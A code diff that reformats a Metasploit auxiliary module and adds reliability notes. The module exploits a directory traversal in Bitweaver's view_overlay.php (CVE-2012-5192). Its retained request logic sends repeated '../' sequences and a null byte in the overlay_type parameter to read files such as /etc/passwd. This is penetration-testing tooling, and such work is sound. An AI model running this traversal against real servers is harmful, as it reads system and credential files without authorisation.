@@ -9,39 +9,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Bitweaver overlay_type Directory Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Bitweaver overlay_type Directory Traversal',
+        'Description' => %q{
           This module exploits a directory traversal vulnerability found in Bitweaver.
-        When handling the 'overlay_type' parameter, view_overlay.php fails to do any
-        path checking/filtering, which can be abused to read any file outside the
-        virtual directory.
-      },
-      'References'     =>
-        [
+          When handling the 'overlay_type' parameter, view_overlay.php fails to do any
+          path checking/filtering, which can be abused to read any file outside the
+          virtual directory.
+        },
+        'References' => [
           ['CVE', '2012-5192'],
           ['OSVDB', '86599'],
           ['EDB', '22216'],
           ['URL', 'http://web.archive.org/web/20130827041908/https://www.trustwave.com/spiderlabs/advisories/TWSL2012-016.txt']
         ],
-      'Author'         =>
-        [
-          'David Aaron',       # Trustwave SpiderLabs
+        'Author' => [
+          'David Aaron', # Trustwave SpiderLabs
           'Jonathan Claudius', # Trustwave SpiderLabs
           'sinn3r'             # Metasploit
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2012-10-23'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2012-10-23',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The URI path to the web application', '/bitweaver/']),
-        OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
-        OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
-      ])
+        OptString.new('FILE', [true, 'The file to obtain', '/etc/passwd']),
+        OptInt.new('DEPTH', [true, 'The max traversal depth to root directory', 10])
+      ]
+    )
   end
-
 
   def run_host(ip)
     base = target_uri.path
@@ -53,10 +59,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Reading '#{datastore['FILE']}'")
     traverse = "../" * datastore['DEPTH']
     res = send_request_cgi({
-      'method'        => 'GET',
+      'method' => 'GET',
       'encode_params' => false,
-      'uri'           => normalize_uri(base, "gmap/view_overlay.php"),
-      'vars_get'      => {
+      'uri' => normalize_uri(base, "gmap/view_overlay.php"),
+      'vars_get' => {
         'overlay_type' => "#{traverse}#{fname}%00"
       }
     })
